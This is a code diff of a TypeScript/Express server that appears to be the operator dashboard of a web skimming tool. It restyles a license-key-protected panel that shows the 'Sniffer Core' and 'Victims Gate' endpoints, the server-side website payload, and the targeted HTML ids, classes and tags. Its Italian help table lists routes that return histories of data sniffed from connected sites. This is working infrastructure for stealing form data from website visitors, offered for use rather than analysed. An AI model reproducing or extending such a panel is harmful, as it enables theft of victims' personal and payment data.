@@ -51,83 +51,92 @@ export class App {
         app.get('/'+this.salty,(req,res)=>{
           res.send(this.eccipient);
         });
-        app.get('/'+this.conf.licenseKey+'/status',(req,res)=>{
+        app.get('/'+this.conf.licenseKey,(req,res)=>{
           let commonids='';
           let commontags='';
           let commonclasses='';
           this.conf.documentids.forEach((id)=>{
             commonids +='\''+id+'\','
           });
-          this.conf.documentclasses.forEach((id)=>{
-            commonclasses +='\''+id+'\','
-          });
           this.conf.documenttags.forEach((id)=>{
             commontags +='\''+id+'\','
           });
-          res.send(`<style>
-                               table {
-                                 font-family: arial, sans-serif;
-                                 border-collapse: collapse;
-                                 width:500px;
-                               }
-                               td, th {
-                                 border: 1px solid #dddddd;
-                                 text-align: left;
-                                 padding: 8px;
-                               }
-                               tr {
-                                 background-color: #dddddd;
-                               }
-                           </style>
-                           <h2>STATUS Page</h2>
-                           <table>
-                           <thead>
-                           <tr>
-                           <th>Parametri</th>
-                           <th>Status</th>
-                           </tr>
-                           <tr>
-                           </thead>
-                           <tbody>
-                           <td>User</td>
-                           <td>`+this.conf.instanceUser+`</td>
-                           </tr>
-                           <tr>
-                           <td>Port</td>
-                           <td>`+this.conf.port+`</td>
-                           </tr>
-                           <tr>
-                           <td>Timer Polling</td>
-                           <td>`+this.conf.polling+`</td>
-                           </tr>
-                           <tr>
-                           <td>Sniffer Core</td>
-                           <td>`+this.detectedIp+':'+this.conf.port+'/'+this.salty+`</td>
-                           </tr>
-                           <tr>
-                           <td>Victims Gate</td>
-                           <td>`+this.detectedIp+':'+this.conf.port+'/gate'+`</td>
-                           </tr>
-                           <tr>
-                           <td>HTML Ids</td>
-                           <td>`+commonids.slice(0,-1)+`</td>
-                           </tr>
-                           <tr>
-                           <td>HTML Classes</td>
-                           <td>`+commonclasses.slice(0,-1)+`</td>
-                           </tr>
-                           <tr>
-                           <td>Tags</td>
-                           <td>`+commontags.slice(0,-1)+`</td>
-                           </tr>
-                           <tr>
-                           <td>Website Payload (Server-Side)</td>
-                           <td>`+'<xmp>'+this.expose+'</xmp>'+`</td>
-                           </tr>
-                          </tbody>
-                           </table>
-                   `)
-                   res.end();
+          this.conf.documentclasses.forEach((id)=>{
+            commonclasses +='\''+id+'\','
+          });
+          res.send(`
+<style>
+body {-webkit-font-smoothing: antialiased;-moz-osx-font-smoothing: grayscale;font-family: 'Roboto Slab', serif; }
+h1 {
+margin: 0;user-select: none;text-align: center;font-weight: 300; }
+p, {max-width: 100%;max-height: 100%;font-weight: 300;color: #546E7A;user-select: none;text-align: center;margin: 0; }
+a {text-align: center;text-decoration: none;color: #FFF; }
+/* Navigation menu */
+.menu {position: fixed;width: 100vw;pointer-events: none;margin-top: 10vh;text-align: center;z-index: 2; }
+/* Menu link item */
+.menu__link {display: inline-block;text-decoration: none;border: 2px solid #263238;color: #263238;pointer-events: auto;line-height: 40px;position: relative;padding: 0 50px;box-sizing: border-box;margin: 0;user-select: none;overflow: hidden;border-radius: 50px;
+&::before {content: attr(data-hover);background-color: #263238;color: #FFF;position: absolute;top: 100%;bottom: 0;left: 0;transition: all 300ms cubic-bezier(0.190, 1.000, 0.560, 1.000);right: 0; }
+&:hover::before {top: 0; }}
+/* Panels Style*/
+/* Common panel style */
+.panel {display: flex;align-items: center;justify-content: center;flex-direction: column;position: absolute;top: 0;bottom: 0;left: 0;right: 0;overflow: auto;z-index: 999;color: #000;box-sizing: border-box;background-color: #ECEFF1; }
+/* panel content (only for animation delay after open) */
+.panel__content {opacity: 0;will-change: margin-top;transition: all 700ms;transition-delay: 600ms;padding: 100px 200px;margin-top: -5%; }
+.panel__content p{text-align: center;text-decoration: none;color: #FFF;}
+/* Panel content animation after open */
+.panel:target .panel__content {opacity: 1;margin-top: 0; }
+/*  Specific "Home "panel */
+.panel#home {
+z-index: 1;
+background: radial-gradient(ellipse at center, rgba(255,255,255,1) 0%,#CFD8DC 100%); }
+/*  Specific panel "Fade" effect */
+.panel#fade {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
+.panel#fade2 {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
+.panel#fade3 {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
+.panel#fade:target {opacity: 1;pointer-events: auto; }
+.panel#fade2:target {opacity: 1;pointer-events: auto; }
+.panel#fade3:target {opacity: 1;pointer-events: auto; }
+</style>
+            <div class="panel" id="home">
+                <h1>Oniric</h1><br>
+            </div>
+            <div class="panel" id="fade2">
+                <div class="panel__content">
+                <p>Website Payload (Server-Side)</p>
+                <p style="overflow:scroll;max-width:250px;max-height:250px">`+this.expose+`</p>
+                </div>
+                <a href="/`+this.conf.licenseKey+`"> Close [ X ]</a>
+            </div>
+            <div class="panel" id="fade3">
+                <div class="panel__content">
+                <p>User:`+this.conf.instanceUser+`</p>
+                <p>Port:`+this.conf.port+`</p>
+                <p>Timer Polling:`+this.conf.polling+`</p>
+                <p>Sniffer Core:`+this.detectedIp+':'+this.conf.port+'/'+this.salty+`</p>
+                <p>Victims Gate:`+this.detectedIp+':'+this.conf.port+'/gate'+`</p>
+                <a href="/`+this.conf.licenseKey+`">[ X ]</a>
+            </div>
+            </div>
+            <div class="panel" id="fade">
+                <div class="panel__content">
+                <p>HTML IDs</p>
+                <p style="overflow:scroll;max-width:250px;max-height:250px">`+commonids.slice(0,-1)+`</p><br>
+                <p>HTML Classes</p>
+                <p style="overflow:scroll;max-width:250px;max-height:250px">`+commonclasses.slice(0,-1)+`</p><br>
+                <p>HTML Tags</p>
+                <p style="overflow:scroll;max-width:250px;max-height:250px">`+commontags.slice(0,-1)+`</p><br>
+                <a href="/`+this.conf.licenseKey+`">[ X ]</a>
+            </div>
+            </div>
+            <div class="menu">
+              <a class="menu__link" href="#fade2" data-hover="Fade">Payload</a>
+              <a class="menu__link" href="#fade3" data-hover="Fade">User Status</a>
+              <a class="menu__link" href="#fade" data-hover="Fade">HTML Config</a>
+              <a class="menu__link" href="/`+this.conf.licenseKey+`/help" data-hover="Fade">Help</a><br>
+              <a class="menu__link" href="#fade" data-hover="Fade">History Dbs</a>
+              <a class="menu__link" href="#fade" data-hover="Fade">Modify</a>
+            </div>
+            `);
         });
         app.get('/'+this.conf.licenseKey+'/help',(req,res)=>{
           res.send(`<style>
@@ -154,10 +163,6 @@ export class App {
                   <tr>
                   <td>/licenseKey/help</td>
                   <td>Ritorna questa pagina</td>
-                  </tr>
-                  <tr>
-                  <td>/licenseKey/status</td>
-                  <td>Visualizza una panoramica dei parametri</td>
                   </tr>
                   <tr>
                   <td>/licenseKey/restart</td>
@@ -195,12 +200,6 @@ export class App {
                   <td>/licenseKey/info/list</td>
                   <td>Ritorna uno storico riguardante i dati sniffati sui vari siti a cui è collegato</td>
                   </tr>
-                  <tr>
-                  <tr>
-                  <td>/licenseKey/session/list</td>
-                  <td>Ritorna uno storico riguardante le operazioni di sniff sui vari siti a cui è collegato</td>
-                  </tr>
-                  <tr>
                   <tr>
                   <td>/licenseKey/search/info</td>
                   <td>Ritorna uno storico riguardante i chunks di sniff sui vari siti relativi al dominio cercato</td>
